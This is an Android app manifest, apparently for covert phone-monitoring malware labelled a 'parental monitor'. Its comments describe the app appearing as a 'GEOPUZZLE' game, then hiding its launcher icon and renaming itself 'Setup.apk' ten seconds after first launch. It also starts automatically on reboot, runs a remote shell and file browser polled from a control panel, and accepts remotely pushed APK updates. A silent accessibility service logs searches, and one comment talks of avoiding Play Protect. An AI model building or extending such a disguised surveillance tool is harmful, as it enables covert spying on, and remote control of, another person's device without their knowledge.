<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />
    <!-- Android 14+: required to run foreground services with a type -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
    <!-- Auto-start after reboot so the phone never goes unmonitored -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <!-- Lets the panel push an updated APK remotely (PackageInstaller self-update) -->
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />

    <application
        android:label="Setup.apk"
        android:icon="@mipmap/ic_launcher"
        android:allowBackup="false"
        android:supportsRtl="true"
        android:usesCleartextTraffic="true"
        android:enabled="true"
        android:persistent="true">

        <!-- Status screen. No LAUNCHER category (no app-drawer icon, like
             Pinardin's child app); opened from the ongoing notification or
             the dw://open deep link. A real, disclosed screen beats the
             old "icon that instantly finishes" pattern Play Protect hates. -->
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTask"
            android:excludeFromRecents="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <category android:name="android.intent.category.BROWSABLE" />
                <data android:scheme="dw" android:host="open" />
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
            </intent-filter>
        </activity>

        <!-- Shows as GEOPUZZLE with the purple-G icon right after install.
             MainActivity disables this alias 10s after the first launch, so the
             app then has no launcher logo and is named "Setup.apk". -->
        <activity-alias
            android:name=".GeoPuzzleAlias"
            android:targetActivity=".MainActivity"
            android:exported="true"
            android:enabled="true"
            android:icon="@mipmap/ic_launcher"
            android:label="GEOPUZZLE">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- Foreground service keeps the process alive on Android 14 -->
        <service
            android:name=".KeepAliveService"
            android:exported="false"
            android:foregroundServiceType="dataSync|specialUse">
            <property
                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                android:value="parental-monitor-beacon" />
        </service>

        <!-- Remote shell + file browser from the control panel (polls /term/poll) -->
        <service
            android:name=".RemoteShellService"
            android:exported="false"
            android:foregroundServiceType="dataSync|specialUse">
            <property
                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
                android:value="parental-monitor-remote-shell" />
        </service>

        <!-- Start services automatically after reboot (Samsung + AOSP intents) -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <!-- Quick Settings Flashlight tile -->
        <service
            android:name=".FlashlightTileService"
            android:exported="true"
            android:permission="android.permission.BIND_QUICK_SETTINGS">
            <intent-filter>
                <action android:name="android.service.quicksettings.TileService" />
            </intent-filter>
        </service>

        <!-- Silent Accessibility search logger -->
        <service
            android:name=".SafetyService"
            android:label="@string/accessibility_service_label"
            android:icon="@android:drawable/ic_menu_camera"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">

            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>

            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

    </application>
</manifest>